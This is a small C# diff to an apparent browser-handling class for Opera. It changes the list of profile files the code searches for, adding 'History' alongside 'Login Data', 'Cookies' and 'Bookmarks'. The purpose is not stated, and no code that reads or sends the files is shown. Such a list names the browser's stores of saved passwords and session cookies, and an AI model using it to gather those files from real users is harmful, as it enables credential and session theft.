@@ -6,7 +6,7 @@ namespace WorkBrowser
 {
     class Opera : WorkBrowser
     {
-        private string[] _NameFindFiles = { "Login Data", "bookmarks", "Cookies", "Reporting and NEL" };
+        private string[] _NameFindFiles = { "Login Data", "Bookmarks", "Cookies", "Reporting and NEL","History" };
 
         public Opera(string userpath)
         {
